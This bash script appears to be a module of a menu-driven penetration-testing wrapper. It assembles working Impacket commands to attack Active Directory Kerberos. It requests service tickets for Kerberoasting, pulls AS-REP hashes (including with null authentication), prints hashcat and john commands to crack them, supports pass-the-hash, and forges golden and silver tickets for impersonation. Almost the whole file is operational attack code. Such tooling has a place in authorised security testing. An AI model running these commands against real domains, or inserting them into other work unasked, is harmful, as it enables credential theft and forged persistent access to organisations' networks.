#!/bin/bash
#
# Impacket Kerberos Module
# Contains Kerberos attack tools: Kerberoasting, AS-REP Roasting, Ticket Operations
#
# This module provides functions for Kerberos-based attacks on Active Directory:
#   - Kerberoasting: Extract and crack service account passwords (GetUserSPNs)
#   - AS-REP Roasting: Target accounts without Kerberos pre-authentication (GetNPUsers)
#   - Golden/Silver Tickets: Forge Kerberos tickets for persistence
#   - TGT Operations: Request and manage Kerberos tickets
#

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Note: This module expects the following global variables to be set:
# - DOMAIN: Domain name
# - USERNAME: Username for authentication
# - PASSWORD: Password for authentication
# - HASH: NTLM hash for pass-the-hash
# - TARGET: Target IP or hostname
# - CURRENT_CRED_NAME: Name of current credentials (for null auth detection)
#
# And these functions to be available:
# - get_target_for_command(): Gets target(s) based on run mode
# - show_menu(): Displays menu using fzf
# - run_command(): Executes command with preview and confirmation

# Handle Kerberoasting operations (GetUserSPNs)
handle_kerberoast() {
    target=$(get_target_for_command) || return
    subchoice=$(show_menu "impacket_kerberoast" "Select Kerberoasting Option: ")

    if [[ -n "$HASH" ]]; then
        impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
    else
        impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
    fi

    case "$subchoice" in
        "Kerberoast All SPNs")
            echo -e "${CYAN}Requesting TGS tickets for all users with SPNs${NC}"
            run_command "impacket-GetUserSPNs $impacket_auth -request"
            ;;
        "Kerberoast Specific User")
            read -p "Username to target: " targetuser
            run_command "impacket-GetUserSPNs $impacket_auth -request-user '$targetuser'"
            ;;
        "Request TGS for All Users")
            echo -e "${CYAN}Saving to kerberoast.txt${NC}"
            run_command "impacket-GetUserSPNs $impacket_auth -request -outputfile kerberoast.txt"
            ;;
        "Output to Hashcat Format")
            echo -e "${CYAN}Saving to kerberoast.hashcat${NC}"
            run_command "impacket-GetUserSPNs $impacket_auth -request -outputfile kerberoast.hashcat"
            echo -e "\n${GREEN}Crack with: hashcat -m 13100 kerberoast.hashcat wordlist.txt${NC}"
            read -p "Press Enter to continue..."
            ;;
        "Output to John Format")
            echo -e "${CYAN}Saving to kerberoast.john${NC}"
            run_command "impacket-GetUserSPNs $impacket_auth -request -format john -outputfile kerberoast.john"
            echo -e "\n${GREEN}Crack with: john --wordlist=wordlist.txt kerberoast.john${NC}"
            read -p "Press Enter to continue..."
            ;;
    esac
}

# Handle AS-REP Roasting operations (GetNPUsers)
handle_asreproast() {
    target=$(get_target_for_command) || return
    subchoice=$(show_menu "impacket_asreproast" "Select AS-REP Roasting Option: ")

    # AS-REP roasting can work without credentials
    if [[ "$CURRENT_CRED_NAME" == "Null Auth" ]]; then
        echo -e "${CYAN}No credentials needed for AS-REP roasting!${NC}"
        impacket_auth="$DOMAIN/ -no-pass -dc-ip $target"
    elif [[ -n "$HASH" ]]; then
        impacket_auth="$DOMAIN/$USERNAME -hashes :$HASH -dc-ip $target"
    else
        impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD' -dc-ip $target"
    fi

    case "$subchoice" in
        "AS-REP Roast All Users")
            echo -e "${CYAN}Checking all users for AS-REP roasting${NC}"
            run_command "impacket-GetNPUsers $impacket_auth -request"
            ;;
        "AS-REP Roast from User List")
            read -p "User list file: " userlist
            run_command "impacket-GetNPUsers $impacket_auth -usersfile '$userlist' -request"
            ;;
        "Output to Hashcat Format")
            echo -e "${CYAN}Saving to asreproast.hashcat${NC}"
            run_command "impacket-GetNPUsers $impacket_auth -request -format hashcat -outputfile asreproast.hashcat"
            echo -e "\n${GREEN}Crack with: hashcat -m 18200 asreproast.hashcat wordlist.txt${NC}"
            read -p "Press Enter to continue..."
            ;;
        "Output to John Format")
            echo -e "${CYAN}Saving to asreproast.john${NC}"
            run_command "impacket-GetNPUsers $impacket_auth -request -format john -outputfile asreproast.john"
            echo -e "\n${GREEN}Crack with: john --wordlist=wordlist.txt asreproast.john${NC}"
            read -p "Press Enter to continue..."
            ;;
        "Check Specific User")
            read -p "Username to check: " checkuser
            run_command "impacket-GetNPUsers $impacket_auth -request -user '$checkuser'"
            ;;
    esac
}

# Handle Golden/Silver Ticket operations
handle_tickets() {
    target=$(get_target_for_command) || return
    subchoice=$(show_menu "impacket_tickets" "Select Ticket Operation: ")

    case "$subchoice" in
        "Create Golden Ticket")
            echo -e "${CYAN}Creating Golden Ticket (requires krbtgt hash)${NC}"
            read -p "Domain name: " dom
            read -p "Domain SID: " sid
            read -p "krbtgt NTLM hash: " krbtgt_hash
            read -p "Username to impersonate: " user
            run_command "impacket-ticketer -nthash '$krbtgt_hash' -domain-sid '$sid' -domain '$dom' '$user'"
            echo -e "\n${GREEN}Golden ticket saved as ${user}.ccache${NC}"
            echo -e "${GREEN}Export: export KRB5CCNAME=${user}.ccache${NC}"
            read -p "Press Enter to continue..."
            ;;
        "Create Silver Ticket")
            echo -e "${CYAN}Creating Silver Ticket (requires service account hash)${NC}"
            read -p "Domain name: " dom
            read -p "Domain SID: " sid
            read -p "Service account NTLM hash: " svc_hash
            read -p "Service SPN (e.g., cifs/dc01.domain.local): " spn
            read -p "Username to impersonate: " user
            run_command "impacket-ticketer -nthash '$svc_hash' -domain-sid '$sid' -domain '$dom' -spn '$spn' '$user'"
            echo -e "\n${GREEN}Silver ticket saved as ${user}.ccache${NC}"
            read -p "Press Enter to continue..."
            ;;
        "Request TGT")
            echo -e "${CYAN}Requesting TGT${NC}"
            if [[ -n "$HASH" ]]; then
                impacket_auth="$DOMAIN/$USERNAME -hashes :$HASH"
            else
                impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'"
            fi
            run_command "impacket-getTGT $impacket_auth -dc-ip $target"
            ;;
        "Export Ticket (ccache)")
            read -p "Ticket file (.ccache): " ticket
            echo -e "\n${GREEN}To use this ticket:${NC}"
            echo -e "${GREEN}export KRB5CCNAME=$ticket${NC}"
            read -p "Press Enter to continue..."
            ;;
        "Import Ticket")
            read -p "Ticket file to import: " ticket
            run_command "export KRB5CCNAME='$ticket' && echo 'Ticket imported! Use Kerberos-based tools now.'"
            ;;
    esac
}
